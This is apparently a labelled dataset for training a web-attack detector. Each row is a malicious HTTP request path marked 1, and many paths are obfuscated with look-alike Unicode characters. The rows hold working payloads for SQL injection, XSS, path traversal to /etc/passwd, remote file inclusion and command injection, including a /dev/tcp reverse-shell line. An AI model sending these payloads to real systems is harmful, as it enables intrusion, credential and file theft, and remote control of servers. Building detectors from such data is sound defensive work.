sentences 	 labels
/ 𝙚𝘹amples / jsp / checkbox / search / search . cgi ? keys =  *  & prc = any & catigory =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc  	 1
/ 𝔰𝓽ring / strings / parameters = !  [ a ]  ( data : text / html ; base64 , phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k )  \  	 1
/ 𝔰𝙮stem / admin / include / upload_form . php ? globals = xxpathxx  	 1
/ ꜱ𝔱ring / strings / parameters = "  >  < svg / onload "  	 1
/ 𝓈𝔱ring / strings / parameters = |   [  2 -ne  $  ( echo mydvjm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ 𝓈𝑡ring / modo = registro & login = beatriz & password = m9n87d90 & nombre = luciliano & apellidos = arlat + poma & email = pezzotta-castella @ artesania . org . nc & dni = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & direccion = calle + kadiga + 91 +  & ciudad = bobadilla & cp = 31750 & provincia = barcelona & ntc = 4154281799426251 & b1 = registrar  	 1
/ ϲƍi-bin / include / sql . php ? include_path =  / etc / passwd \ x00  	 1
/ 𐑈𝕥ring / strings / parameters = ;  str =  $  ( echo ybrdji )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ 𝕖𝚡amples / jsp / cal / engine / admin / admin . php ? id_user =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝓼𝕥ring / strings / parameters = 1 '  )  )  ; select case when 7717 = 7717 then 1 else null end --  	 1
/ 𝑠𝘵ring / strings / parameters = 1 "  "  where 2878 = 2878 union all select null , null , null , null , null #  	 1
/ 𝑠𝖙ring / modo = entrar & login = sydeman6 & pwd = 0nc / on / 6it , ar & remember = on & b1 = entrar  	 1
/ 𑣠𑜊155a7c . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ j𝙖𝓿ascript / submissions . exe  	 1
/ 𝖊𝘹amples / jsp / jsp2 / jspx / bemarket / shop / index . php ? pageurl = viewpage & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝔲𐌚yiqilu . jspa ?  < meta http-equiv = set-cookie content =  " testswjp = 6010 "  >  	 1
/ ℮n-𝒖s / 33y9gcqq . kspx ?  < script > document . cookie =  " testnvxc = 4301 ;  "  <  / script >  	 1
/ 𝘀𝗍ring / strings / parameters = xxxxx ` perl -e  ' print  "  .  % p "  x 80 '  `  	 1
/ ꜱ𝓽ring / str =  $  ( echo zsoawg )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ 𝕤𝓽ring / modo = registro & login = hurwitz & password = p7rdulario & nombre = yasmila & apellidosa = raquer + de + la + poza & email = kober @ sindns . ve & dni = 24117332s & direccion = calle + barri + trinitat + nova ,  + s / n ,  + 13d & ciudad = parra + de + las + vegas ,  + la & cp = 12709 & provincia = len & ntc = 1828745224462815 & b1 = registrar  	 1
/ m𝐚𝑖n . php ? stuff =  "  & uname \ x09 > q71999354 \ x09 #  	 1
/ 𝗌𝕥ring / strings / parameters = '  |   [  7 -ne  $  ( echo ygeokn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  	 1
/ ỿѵer8r9o . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𐑈𝒕ring / modo = registro & login = pojanart & password = 2ic15 & nombre = amando & apellidos = mompart + anglaril & emaila = parente @ espaciopintor . ro & dni = 65049815l & direccion = plza .  + pablo + picasso + 198 + 4-c & ciudad = villamoronta & cp = 03517 & provincia = teruel & ntc = 8000827068875110 & b1 = registrar  	 1
/ еn-𝘂s / ddoworrl . exe ?  < meta http-equiv = set-cookie content =  " testvlau = 8517 "  >  	 1
/ ƽ𝖙ring / strings / parameters = 1 '  |  |  ( select  ' frrk '  from dual where 3145 = 3145 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  '  	 1
/ m𝚊𝒊n . php ? stuff =  '  \ x0ddel q65565224  #  	 1
/ 𝔰𝘁ring / strings / parameters = 1 %  '  )  )  )  or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ 𝐭o𝗽 . php ? stuff =  "  \ x0adel q63768352  #  	 1
/ l𝟕𝟧2x1ry . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝗁𝟻i6crm3 . dll ?  < meta http-equiv = set-cookie content =  " testlihk = 7070 "  >  	 1
/ 𝓈𝚝ring / strings / parameters = '  |  | echo $ ifsblppxu $  (  ( 2 + 17 )  )  $  ( echo $ ifsblppxu ) blppxu |  	 1
/ 𝐬𝐭ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ 𝚜𝔱ring / modo = registro & login = somppi & password = paparote & nombre = juliana & apellidos = vilardaga + bedmar & email = gardner-zimmer @ alfombra . com . in & dni = 79288923b & direccion = vitoria ,  + 185 + 3 ? a & ciudad = bahabn & cp = 17464 & provinciaa = vizcaya & ntc = 6889929680639431 & b1 = registrar  	 1
/ 𝖘𝕥ring / strings / parameters = ftp :  /  / 192 . 168 . 22 . 202 /  *  < apache_mod_proxy_ftp_glob_xss . nasl >  	 1
/ 𝘦𝔵amples / jsp / num / sawmill6cl . exe ? ho +  { complete_version }  	 1
/ 𝟙𝟐3flashchat . php ? e107path = xxpathxx  	 1
/ 𝚜𝓽ring / str =  $  ( echo osxami )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 1
/ jn𝔱𝟑f86c . htm ?  < script > document . cookie =  " testcmax = 9270 ;  "  <  / script >  	 1
/ 𑣁𝓽ring / str =  $  ( echo jmudmj )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/  .  /  \  /  .  /  .  /  \  /  .  /  { file }  	 1
/ 𝒔𝘁ring / strings / parameters = < video src =  " x "  onloadstart =  " alert ( 1 )  "  >  	 1
/ ℯ𝓍amples / jsp / sessions / sql . php3 ? lib_inc = 1 & btndrop = no & goto =  / etc / passwd  	 1
/ 𝚜𝕥ring / strings / parameters = '  ; echo zdxlmm $  (  ( 81 + 23 )  )  $  ( echo zdxlmm ) zdxlmm '  	 1
/ 𝑐𝘨i-bin / cal_make . pl ? p0 =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝖘𝓽ring / strings / parameters = <  !  --  [ if < img src = x onerror = alert ( 2 )  /  /  ]  >   --  >  /  /  [  "  '  `  --  >  ]  ]  >  ]  <  / div >  	 1
/ 𝗌𝘵ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qtrmrj )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 1
/ 𝐬𝖙ring / strings / parameters = 1 %  '  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 1
/ 𐑈𝚝ring / id = 1 /  & nombre = queso + manchego & precio = 39 & cantidad = 26 & b1 = aadir + al + carrito  	 1
/ 𝒔𝖙ring / strings / parameters = order by 23  	 1
/ 𝓼𝙩ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo kzpzzi )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 1
/ е𝓍amples / jsp / colors / index . php ? action = view & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ ꜱ𝒕ring / str =  $  ( echo uvfukr )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 1
/ 𝚌𝚒trix / metaframexp / default / login . asp ? nfuse_logoutid =  & nfuse_messagetype = error & nfuse_message =  < script > alert (  ' ritchie '  )  <  / script >  & clientdetection = on  	 1
/ 𝙝𝓉bin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝗶n𝒅ex . php ? c = access & a = login & ref_c = nessus "  >  < script > alert ( 624246618 )  <  / script >  & ref_a = projectpier_login_page_xss . nasl "  >  < script > alert ( 251808778 )  <  / script >  	 1
/ е𝗑amples / jsp / cal / alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  	 1
/ m𝓪n𝙖ger / zml . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝙗𝖞rg33fw . php ?  < script > document . cookie =  " testexuu = 5340 ;  "  <  / script >  	 1
/ on𝗲𝐚dmin / config-bak . php ? include_once = xxpathxx  	 1
/ 𝘴ⅽript / ident / loginliste . php ? path_inc = xxpathxx  	 1
/ 𝟯j𞣋echh0 . exe ?  < script > document . cookie =  " testfuqi = 4189 ;  "  <  / script >  	 1
/ 𑜊𝒉eelman ' s - bushpig /  	 1
/ 𝘩𝘦lp . php ? q =  "  & del , q45293431 & rem ,  	 1
/ m𝒂𝓲n . php ? stuff =  " ver \ xa0 > q33347165 & rem \ xa0  	 1
/ ꬲn-𝘶s / 9kr0ih0v . php ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  / script >  	 1
/ ѕ𝙩ring / strings / parameters = |  | echo pntmbc $  (  ( 8 + 17 )  )  $  ( echo pntmbc ) pntmbc \  \  	 1
/ 𝔰𝔱ring / strings / parameters = "  |   [  5 -ne  $  ( echo cinwsa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ 𝑒×amples / servlets / servlet / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1738276559 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ 𝔰𝙩ring / strings / parameters = 1 %  '  )  )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  #  	 1
/ ꜱ𝑡ring / strings / parameters = >  "  "  < script  < b > document . cookie = true ;  <  / script >  	 1
/ 𝖘𝐭ring / strings / parameters = 1 where 7522 = 7522 and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  	 1
/ 𐑈𝑡ring / strings / parameters = 1 '  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  ' eaxu '  =  ' eaxu  	 1
/ 𝗮𝙬stats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  " vj \ 0001j \ 0002 \ 0211 \ 0341j \ 0001jfx \ 0133 \ 0315 \ 0200 \ 0222 "   >  >   / tmp / xmefwyizyj0 ; echo | awstats649475 . txt  	 1
/ 𐑈𝘵ring / modo = entrar & login = hatti & pwd = c ' 90b170a & remember = off & b1 = entrar  	 1
/ 𑣁𝓽ring / strings / parameters = -3525 "  "  where 3522 = 3522 union all select 3522 , 3522 , 3522 , 3522 , 3522 , 3522 , 3522 , 3522 , 3522 #  	 1
/ j𝑎𑜆ascript / document . txt  	 1
/ 𝑠𝕥ring / strings / parameters = $  {  @ print ( system ( â�œwhoamiâ��? )  )  }  	 1
/ 𝗌𝐭ring / strings / parameters = 1 "  "  )  )  as sqow where 8752 = 8752 ; select  ( case when  ( 1726 = 4080 )  then 1726 else 1 /  ( select 0 )  end )  --  	 1
/ а𝘥odb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  /  	 1
/ o𝒄𝘱-103 / index . php ? req_path = xxpathxx  	 1
/ j𝒂𝕧ascript / showthread . exe  	 1
/ 𐑈𝐭ring / strings / parameters = < style / onload =  & lt ;  !  --  &  # 09 ;  & gt ;  &  # 10 ; confirm &  # 10 ;  & lpar ; 1 & rpar ;  >  	 1
/ 𝑠𝘁ring / strings / parameters = '  echo doxqvc $  (  ( 74 + 61 )  )  $  ( echo doxqvc ) doxqvc |  	 1
/ 𝘴𝖙ring / modo = registro & login = morrie & password = epa & nombrea = erlan & apellidos = sordo + alquinta & email = nieva @ menorca . com . sz & dni = 22787443d & direccion = pl .  + de + la + palomera ,  + s / n + 2 ? d & ciudad = oss + de + si & cp = 31353 & provincia = badajoz & ntc = 5124736256894307 & b1 = registrar  	 1
/ ϲlαssifieds / index . php ? lowertemplate = xxpathxx  	 1
/ 𝚎n-𝒖s / account / resetpw . php ? email =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝖙𝖊mplates / default / index_logged . php ? main_loaded = 1 & cur_module = xxpathxx  	 1
/ n𝚎𝔀s / include / createdb . php ? langfile ;  =  @ rfiurl ? langfile ;  =  @ rfiurl ?  	 1
/ 𝑠𝐭ring / strings / parameters = '  ;  waitfor delay  ' 0 : 30 : 0 '  --  	 1
/ 𝙚𝕩amples / jsp / checkbox / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_inohuydx ]  )  )  ; die ;  /  *  	 1
/ 𝓍🯲gyorli . idc ?  < meta http-equiv = set-cookie content =  " testwhac = 3130 "  >  	 1
/ ꜱ𝙩ring / strings / parameters = 1 "  "  )  as ifgl where 2190 = 2190 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  --  	 1
/ 𝕡𝗿ojects / 1 / repository / annotate ? rev =  ` 0 <  & 208- ; exec 208 <  >  / dev / tcp / 192 . 168 . 202 . 118 / 26475 ; sh  <  & 208  >  & 208 2 >  & 208 `  	 1
/ 𝐮𝓿azfs7p . jspa ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 1
/ 𝚜𝒕ring / b2 =  |  	 1
/ 𝙨𝙩ring / strings / parameters = 1 %  '  )  )  union all select null , null , null , null , null , null #  	 1
/ 𝗌𝚝ring / strings / parameters = ;  str =  $  ( echo ewygbo )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ 𝕘𝟯w7y7u5 . html ?  < script > document . cookie =  " testbfpq = 3326 ;  "  <  / script >  	 1
/ 𝘀𝕥ring / strings / parameters = <  / svg : mask >  	 1
/ ⅴ𝔴mg565s . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝓼𝖙ring / modo = registro & login = tiong-ho & password = an1l5m9no & nombre = hadasa & apellidos = subias & email = parada . biuchet4 @ aulahost . gw & dni = 79845869n & direccion = jacinto + benavente ,  + 165 + 7f & ciudad = herreruela & cp = 11330 & provincia = teruel & ntc = any  set-cookie :  + tamper = 5765205567234876235 & b1 = registrar  	 1
/ 𝟙Ⳓ9okeyj . php ?  < meta http-equiv = set-cookie content =  " testxeoi = 3573 "  >  	 1
/ 𝘀𝙩ring / strings / parameters = 1 '  +  ( select ggah where 3263 = 3263 and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  )  +  '  	 1
/ 𝓿𝒽zmaia2 . fts ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  	 1
/ ⅽℊi-bin /  ? user = jffnms_user_sql_injection . nasl '  union select 2 ,  ' admin '  ,  '  $ 1 $ rxs1rotx $ iza1s3fccfyvfa9rwkbmi .  '  ,  ' administrator '  --  & file = index & pass =  	 1
/ 𑣁𝘵ring / strings / parameters = % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a % a  	 1
/ 𝓼𝖙ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo jicoqs )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/ 𝒔сripts ? username =  "  < script > foo <  / script  	 1
/ ƽ𝑡ring / strings / parameters = '  ;  str =  $  ( echo zahuzd )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ 𝖘𝓉ring / strings / parameters = ;  str =  $  ( echo gzpdpd )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 1
/ j𝖺𝓋ascript / search . exe  	 1
/ 𝔱o𝓅 . php ? stuff =  "  \ x0auname \ x09 > q69986769 \ x09 #  	 1
/ 𝒔𝗍ring / modo = entrar & login = barde8 & pwd = ensueo & remember = off /  & b1 = entrar  	 1
/ 𝐬𝙩ring / strings / parameters = '  echo dootql $  (  ( 40 + 84 )  )  $  ( echo dootql ) dootql &  	 1
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  \  { file }  	 1
/ 𝗌𝖼ripts / index . phtml ? mode = view & album =  ` id `  & pic = a = 10 . jpg & dispsize = 640 & start = 0  	 1
/ 𝘀𝘵ring / strings / parameters = |  | echo csdayb $  (  ( 1 + 92 )  )  $  ( echo csdayb ) csdayb '  	 1
/ 𝗲ⅹamples / jsp / jsp2 / el / includes / converter . inc . php ? include_path =  / etc / passwd \ x00  	 1
/ 𝐡𝙚lp . php ? q =  "  \ x0auname  > q51358327  #  	 1
/ 𝖾𝙭amples / jsp / jsp2 / jspx / calendar_admin . pl ? config =  | cat  / etc / passwd |  	 1
/ 𝕤𝐭ring / modo = registro & login = shonuck & password = 9r3h7la8 & nombre = hortencia & apellidos = ma + moscoso & email = valadez @ gaudio . bj & dni = 81703579n & direccion = poligono + amargacena + 141 +  & ciudad = hita & cp = 06658 & provincia = barcelona & ntc = 7343251905864691 & b1 =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 1
/ 𝖘𝘁ring / strings / parameters = "  ; echo beqetv $  (  ( 73 + 10 )  )  $  ( echo beqetv ) beqetv "  	 1
/ 𝙚𝑥amples / jsp / jsp2 / el / styles . php ? toroot =  / etc / passwd \ x00  	 1
/ 𝕔𝗮cti / home / search . asp ? nchannel =  ' 1  	 1
/ 𝐬𝒕ring / strings / parameters = 1 and  ( 3020 = 3020 )  * 6703 --  zsnl  	 1
/ 𝗌𝘵ring / strings / parameters = &  ping -i 30 127 . 0 . 0 . 1  &  	 1
/ ꬲ𝔁amples / jsp / sessions / hw3 . cgi ? daysonly = 0 )  . system (  ' id '  )  .  (  	 1
/ 𝗲⤬amples / jsp / cal / store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 1
/  ?  < script > document . cookie =  " testcrcv = 6167 ;  "  <  / script >  	 1
/ 𝚜𝚝ring / modo = registro & login = jeanloui & password = any ?   set-cookie :  + tamper = 1041264011025374727 & nombre = evelio & apellidos = fonfria + castillero & email = sprerris-apfel @ tresbrujas . bn & dni = 89061921x & direccion = c /  + cervantes + 117 ,  + 10 ? g & ciudad = rbel + del + castillo & cp = 50343 & provincia = palencia & ntc = 9895940721818753 & b1 = registrar  	 1
/ ℮𝚡amples / jsp / error /  ? mod = read & id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝙨𝐭ring / strings / parameters = . 0  	 1
/ 𝒔𝒕ring / strings / parameters = 1 %  '  and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 1
/ 𝒆𝐱amples / jsp / jsp2 / el / file . cgi ? name =  / eventcache /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 1
/ ѕ𝖈ript / plugins / phpgacl / admin / index . php ? path_inc = xxpathxx  	 1
/ 𝚜𝘁ring / strings / parameters = 1 '  )  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  and  (  (  ' mmvf '  like  ' mmvf  	 1
/ 𐑈𝓽ring / modo = insertar & precio = 201 & b1 = pasar + por + caja /  	 1
/ ୨o𝟲g5vkn . asp ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ ϲ𝔞cti / catalog . php ? action = category_show & id =  '  	 1
/ ꜱ𝒕ring / strings / parameters = $  { system ( print (  ` echo ddvdpm echo  $  (  ( 1 + 17 )  )  echo ddvdpm echo ddvdpm `  )  ;  )  } ddvdpm  	 1
/ 𝘀𝘁ring / strings / parameters = '  |   [  3 -ne  $  ( echo idqlww  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 1
/ 𝘴𝓉ring / strings / parameters = 1 )  as jvmv where 3857 = 3857 and  ( 5717 = 6483 )  * 6483 --  	 1
/ 𐑈𝒕ring / strings / parameters = |  | echo yzmmii $  (  ( 39 + 60 )  )  $  ( echo yzmmii ) yzmmii "  	 1
/ 𝕤𝒕ring / modo = registro & login = munaz & password = s2ld54i5a & nombre = zulma & apellidos = llombart & email = strimpell @ deuxmanagement . sn & dni = 54841138fbob @  < script > alert ( paros )  <  / script >  . parosproxy . org & direccion = sofia ,  + 60 ,  + 3 ? b & ciudad = finestrat & cp = 01427 & provincia = granada & ntc = 3222655347075896 & b1 = registrar  	 1
/ 𝙨𝑡ring / strings / parameters = '  | echo $ ifspzxchl $  (  ( 23 + 27 )  )  $  ( echo $ ifspzxchl ) pzxchl "  	 1
/ jаⅴascript / fuckoff . exe  	 1
/ 𝔰𝕥ring / strings / parameters = -5496 union all select 2099 , 2099 , 2099 #  	 1
/ 𝒔𝐭ring / strings / parameters = 1 '  )  )  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  (  (  ' glfq '  like  ' glfq  	 1
/ o𝙥𝖙ions . php ? optpage =  < script > alert (  ' vulnerable !  '  )  <  / script >  	 1
/ ƽ𝒕ring / strings / parameters = < iframe srcdoc =  '  & lt ; body onload = prompt & lpar ; 1 & rpar ;  & gt ;  '  >  	 1
/  ,  % env ,  /  	 1
/ ѕ𝓽ring / strings / parameters = 1 %  '  )  ; select sleep ( 5 )  #  	 1
/ ѕ𝘁ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo bkaifj )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ 𝕤𝐭ring / strings / parameters = 1 %  '  )  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  --  	 1
/ 𝖘𝑡ring / strings / parameters = |   [  5 -ne  $  ( echo kbohvq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ 𝒔𝚝ring / strings / parameters = "  ; alert ( 123 )  ; t =  "  	 1
/ ꭵn𝔡ex . php / content / search /  ? sectionid = 3 & searchtext =  < script > alert ( document . cookie )  <  / script >  	 1
/ mαιn . php ? logout =  "  \ x0ddel \ x09q59885581 \ x09 #  	 1
/ ɩnсludes / mkb . php ? phpbb_root_path = xxpathxx ? ls  	 1
/ ɡ𝒉swfouu . pl ?  < meta http-equiv = set-cookie content =  " testsqmm = 5713 "  >  	 1
/ 𝗰𝕒cti / index . php ? id =  '  	 1
/ 𝖊𝒙amples / jsp / sessions / wikka . php ? wakka = homepage /  .  .  /  .  .  / actions / wikkachanges  	 1
/ ѕ𝔱ring / strings / parameters = 1 "  "  or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  and  "  " gknn "  "  like  "  " gknn  	 1
/ 𝒉𝒆lp . php ? q =  "  & ping -w 7000 -n 1 4 . 3 . 2 . 1 & rem  	 1
/ 𝒔𝖙ring / modo = insertar & precio = any ?   set-cookie :  + tamper = 1041264011025374727 & b1 = pasar + por + caja  	 1
/ Ꝫj🯸echh0 . jspa ?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >  	 1
/ 𝘴𝑡ring / strings / parameters = '  )  )  and 0 = benchmark ( 3000000 , md5 ( 1 )  )   /  *  	 1
/ 𝓈𝘵ring / modo = registro & login = dido & password = enmarch3tar & nombre = bertilda & apellidosa = deverdun & email = low . feliciano @ azkara . sj & dni = 19110618x & direccion = prolongacion + algeciras + 169 ,  +  & ciudad = navarredonda + de + gredos & cp = 18418 & provincia = navarra & ntc = 1628195660765454 & b1 = registrar  	 1
/ г𝖾cordings / apps / pbcs . dll / misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 1
/ 𝘦᙮amples / jsp / error / profil . php ? id = 1  < script > foo <  / script >  	 1
/ o𝟣zj🯴u9v . nsf ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  	 1
/ 𝖘𝓉ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ 𝐬𝓽ring / strings / parameters = 1 "  "  )  where 8612 = 8612 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ 𝔰𝐭ring / strings / parameters = 1 "  "  )  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  (  "  " zili "  "  like  "  " zili  	 1
/ 𝗌𝔱ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 1
/ 𝙨𝘵ring / strings / parameters = `  / usr / bin / id `  	 1
/ 𝑠𝙩ring / strings / parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  	 1
/ 𝘀𝑡ring / strings / parameters = ;  str =  $  ( echo tgjacn )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ 𝓽𝟱78vqea . idc ?  < script > document . cookie =  " testsory = 7676 ;  "  <  / script >  	 1
